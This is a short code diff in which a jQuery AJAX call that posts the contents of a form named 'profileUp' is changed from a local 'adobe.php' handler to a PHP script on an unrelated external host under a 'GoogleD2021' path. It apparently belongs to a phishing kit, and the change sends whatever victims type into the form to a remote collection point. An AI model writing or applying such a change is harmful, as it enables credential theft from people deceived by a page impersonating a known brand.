@@ -11,7 +11,7 @@
             var formData = new FormData($("#profileUp")[0]);
 
             $.ajax({
-                url: "adobe.php",
+                url: "https://altaruk6.supremepanel6.co.uk/~islamicl/cq-bin/GoogleD2021/next.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
